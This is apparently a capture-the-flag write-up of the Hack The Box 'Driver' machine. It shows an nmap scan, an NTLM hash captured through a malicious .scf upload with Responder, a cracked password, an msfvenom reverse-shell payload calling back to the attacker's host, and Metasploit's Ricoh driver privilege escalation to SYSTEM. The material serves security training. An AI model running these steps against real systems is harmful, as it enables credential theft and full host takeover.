# Nmap
```bash
# Nmap 7.94SVN scan initiated Fri Dec  6 15:08:09 2024 as: /usr/lib/nmap/nmap -p 80,135,445,5985 -Pn -sCV -A -T4 -O -oN scans/service-scan 10.129.219.164
Nmap scan report for 10.129.219.164
Host is up (0.041s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|Phone (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-06T21:08:25
|_  start_date: 2024-12-06T21:04:57
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.88 ms 10.10.14.1
2   40.89 ms 10.129.219.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec  6 15:09:01 2024 -- 1 IP address (1 host up) scanned in 51.49 seconds
```

# Info
Users:
- tony:liltony

# Foothold
We found SMB but null session is not allowed

In http we found admin:admin credentials working and we can upload files, which are placed in SMB server. With **[ntlm_theft]([https://github.com/Greenwolf/ntlm_theft.git](https://github.com/Greenwolf/ntlm_theft.git))** we create a malicious .scf file and catch NTLM hash with responder:

```bash

┌──(kali㉿kali)-[/Shared/CTFs/Hackthebox/Driver]
└─$ python3 /opt/ntlm_theft/ntlm_theft.py -g scf -s 10.8.79.216 -f test
Created: test/test.scf (BROWSE TO FOLDER)
Generation Complete.

┌──(kali㉿kali)-[/Shared/CTFs/Hackthebox/Driver]
└─$ sudo responder -I tun0
...
[SMB] NTLMv2-SSP Client : 10.129.120.214
[SMB] NTLMv2-SSP Username : DRIVER\tony

[SMB] NTLMv2-SSP Hash : tony::DRIVER:d3cc4d2d36315604:121D421A73E4419DD8D18B5EB693D17D:010100000000000000319A08E447DB011232C9A68401BAC7000000000200080036004E005500340001001E00570049004E002D004D003600580033005800520046005100560059004E0004003400570049004E002D004D003600580033005800520046005100560059004E002E0036004E00550034002E004C004F00430041004C000300140036004E00550034002E004C004F00430041004C000500140036004E00550034002E004C004F00430041004C000700080000319A08E447DB010600040002000000080030003000000000000000000000000020000033D9F02FBBD0F3FB4579609A042ADE8E070E3767F8189308AAB0C7B04149630B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0036003100000000000000000000000000
```

We got tony hash, and we get the password with johnTheRipper (liltony). Now we get WinRM access

# Privilege escalation
If we read PS history we found the following command:
`Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'`

After some research we find driver “RICOH PCL6 UniversalDriver V4.23” exploitable with metasploit: `windows/local/ricoh_driver_privesc`

We get a meterpreter shell with msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.61 LPORT=9001 -f exe -o shell.exe
---
*Evil-WinRM* PS C:\Users\tony\Documents> upload shell.exe
*Evil-WinRM* PS C:\Users\tony\Documents> .\shell.exe
---
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > set LPORT 9001
msf6 exploit(multi/handler) > run
```

Now to get a proper shell, we migrate our meterpreter to a interactive process:

```bash
meterpreter > ps
Process List
============

PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
...SNIP...
1288 568 svchost.exe x64 1 DRIVER\tony C:\Windows\System32\svchost.exe (1 MEANS INTERACTIVE PROCESS)
...SNIP...
2668 1916 shell.exe x64 0 DRIVER\tony C:\Users\tony\Documents\shell.exe

meterpreter > migrate 1288
[*] Migrating from 2668 to 1288...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] Running check method for exploit 47 / 47
[*] 10.129.119.128 - Valid modules for session 1:
============================
# Name Potentially Vulnerable? Check Result
- ---- ----------------------- ------------
...SNIP...
15 exploit/windows/local/ricoh_driver_privesc Yes The target appears to be vulnerable. Ricoh driver directory has full permissions
```

As we saw in PS History, ricoh drivers are exploitable

```bash
msf6 post(multi/recon/local_exploit_suggester) > use windows/local/ricoh_driver_privesc
msf6 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/ricoh_driver_privesc) > set LHOST tun0
msf6 exploit(windows/local/ricoh_driver_privesc) > set LPORT 4448
msf6 exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.14.61:4448
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer RoHkS...
[*] Sending stage (203846 bytes) to 10.129.119.128
[+] Deleted C:\Users\tony\AppData\Local\Temp\rINNusVpH.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 5 opened (10.10.14.61:4448 -> 10.129.119.128:49423) at 2024-12-06 14:50:18 +0100
[*] Deleting printer RoHkS
meterpreter > shell
Process 2384 created.
Channel 2 created.
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```

And we are nt authority\system